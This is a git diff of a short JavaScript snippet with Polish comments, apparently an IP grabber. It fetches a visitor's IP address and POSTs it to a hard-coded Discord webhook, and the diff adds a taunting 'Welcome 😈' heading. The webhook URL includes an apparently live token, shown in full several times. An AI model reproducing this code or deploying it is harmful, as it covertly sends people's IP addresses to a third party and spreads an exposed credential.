@@ -1,4 +1,5 @@
-//https://discord.com/api/webhooks/1130552934896259124/hY-yx3zg6VbJBbBvQJai_EvweU-MFfS5XD9wmCrwgZ6fG80YVj9Vkq1hRTKtbXw3OnEd
+// https://discord.com/api/webhooks/1130552934896259124/hY-yx3zg6VbJBbBvQJai_EvweU-MFfS5XD9wmCrwgZ6fG80YVj9Vkq1hRTKtbXw3OnEd
+<h1>Welcome 😈</h1>
 
 
 
@@ -25,14 +26,17 @@ function getIPAddress() {
   });
 }
 
-// Wyślij adres IP do webhooka
-function sendIPToWebhook(ipAddress) {
-  const webhookURL = 'https://discord.com/api/webhooks/1130552934896259124/hY-yx3zg6VbJBbBvQJai_EvweU-MFfS5XD9wmCrwgZ6fG80YVj9Vkq1hRTKtbXw3OnEd'; // Zmień na adres URL swojego webhooka
 
-  const message = {
-    ipAddress: ipAddress
+// Wysyłanie adresu IP do webhooka
+const sendIPToWebhook = async () => {
+  const ipAddress = await getIPAddress();
+  const webhookURL = 'https://discord.com/api/webhooks/1130552934896259124/hY-yx3zg6VbJBbBvQJai_EvweU-MFfS5XD9wmCrwgZ6fG80YVj9Vkq1hRTKtbXw3OnEd';
+
+  const payload = {
+    ip: ipAddress
   };
-
+  
+  
   const xhr = new XMLHttpRequest();
   xhr.open('POST', webhookURL);
   xhr.setRequestHeader('Content-Type', 'application/json');
